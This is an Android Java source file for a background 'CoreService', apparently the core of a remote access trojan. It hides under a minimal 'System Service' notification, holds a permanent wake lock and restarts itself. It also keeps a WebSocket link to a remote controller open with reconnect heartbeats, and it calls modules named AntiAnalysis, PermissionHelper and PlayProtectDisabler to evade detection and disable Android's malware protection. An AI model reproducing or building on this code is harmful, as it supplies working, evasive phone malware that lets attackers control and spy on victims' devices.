package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.app.ServiceCompat;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.core.SelfHealer;
import com.xrc.system.features.AntiAnalysis;
import com.xrc.system.features.PermissionHelper;
import com.xrc.system.features.PlayProtectDisabler;
import com.xrc.system.network.XRCWebSocketClient;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CoreService extends Service {
    private static final String TAG = Constants.TAG + ":Core";
    private static final int FGS_TYPE_DATA_SYNC = 1 << 6;
    private PowerManager.WakeLock wakeLock;
    private ExecutorService executor;
    private Handler mainHandler;
    private Runnable heartbeatTask;
    private Runnable reconnectTask;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "CoreService created");
        executor = Executors.newSingleThreadExecutor();
        mainHandler = new Handler(Looper.getMainLooper());
        acquireWakeLock();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "CoreService started");
        ServiceCompat.startForeground(this, Constants.NOTIF_ID_CORE, buildNotification(), FGS_TYPE_DATA_SYNC);
        initializeModules();
        startWebSocket();
        startHeartbeat();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.w(TAG, "CoreService destroyed");
        releaseWakeLock();
        if (heartbeatTask != null) mainHandler.removeCallbacks(heartbeatTask);
        if (reconnectTask != null) mainHandler.removeCallbacks(reconnectTask);
        if (executor != null) executor.shutdown();
        XRCWebSocketClient.get(this).disconnect();
        super.onDestroy();
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sys_svc_lock");
                wakeLock.acquire();
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock failed", e);
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    Constants.CHANNEL_ID, "System Service",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Core system service");
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, com.xrc.system.ui.MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, Constants.CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void initializeModules() {
        executor.execute(() -> {
            try {
                AntiAnalysis.get(this).runChecks();
                PermissionHelper.get(this);
                PlayProtectDisabler.get(this);
                if (ConfigManager.get(this).getBoolean(Constants.PREF_FIRST_LAUNCH, true)) {
                    ConfigManager.get(this).setBoolean(Constants.PREF_FIRST_LAUNCH, false);
                }
            } catch (Exception e) {
                Log.e(TAG, "Module init failed", e);
            }
        });
    }

    private void startWebSocket() {
        executor.execute(() -> {
            try {
                Thread.sleep(2000);
                XRCWebSocketClient.get(this).connect();
            } catch (Exception e) {
                Log.e(TAG, "WS start failed", e);
            }
        });
    }

    private void startHeartbeat() {
        heartbeatTask = () -> {
            if (!XRCWebSocketClient.get(this).isConnected()) {
                Log.d(TAG, "WS disconnected, reconnecting...");
                XRCWebSocketClient.get(this).connect();
            }
            mainHandler.postDelayed(heartbeatTask, Constants.WS_HEARTBEAT_INTERVAL);
        };
        mainHandler.postDelayed(heartbeatTask, Constants.WS_HEARTBEAT_INTERVAL);
    }
}
